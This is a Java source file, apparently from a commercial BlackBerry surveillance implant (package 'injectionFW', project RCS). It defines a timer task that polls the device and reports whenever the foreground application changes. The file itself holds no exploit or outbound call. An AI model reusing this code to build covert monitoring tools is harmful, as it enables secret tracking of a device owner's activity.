//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppUpdateManager.java
 * Created      : 28-apr-2010
 * *************************************************/
package injectionFW.Application;

import injectionFW.log.Debug;
import injectionFW.log.DebugLevel;

import java.util.TimerTask;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;

/**
 * The Class AppUpdateManager.
 */
public final class AppUpdateManager extends TimerTask {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppUpdManager", DebugLevel.VERBOSE);
    //#endif
    ApplicationManager manager = ApplicationManager.getApplicationManager();
    //Hashtable appSet = new Hashtable();
    AppListener appListener = AppListener.getInstance();

    boolean running;

    boolean windowName = false;
    String lastName, lastMod;

    // questo e' solo di ottimizzazione
    int lastForegroundId;

    Object syncAppobj = new Object();

    public AppUpdateManager() {

    }

    public AppUpdateManager(AppUpdateManager appManager) {
        lastName = appManager.lastName;
        lastMod = appManager.lastMod;
    }

    public boolean isRunning() {
        return running;
    }

    public void run() {
        synchronized (syncAppobj) {
            if (running) {
                return;
            } else {
                running = true;
            }
        }

        try {

            final int foregroundId = manager.getForegroundProcessId();

            if (lastForegroundId == foregroundId) {
                return;
            }

            lastForegroundId = foregroundId;
            final ApplicationDescriptor[] descriptors = manager
                    .getVisibleApplications();

            // Retrieve the name of running applications.
            for (int i = 0; i < descriptors.length; i++) {
                final ApplicationDescriptor descriptor = descriptors[i];

                // find which one is in foreground
                final int pid = ApplicationManager.getApplicationManager()
                        .getProcessId(descriptor);
                if (pid == foregroundId) {

                    final String name = descriptor.getName();
                    final String mod = descriptor.getModuleName();

                    if (!name.equals(lastName) || !mod.equals(lastMod)) {

                        appListener.applicationForegroundChange(name, lastName,
                                mod, lastMod);

                        lastName = name;
                        lastMod = mod;
                        break;
                    }
                }
            }

        } finally {
            synchronized (syncAppobj) {
                running = false;
            }
        }
    }

}
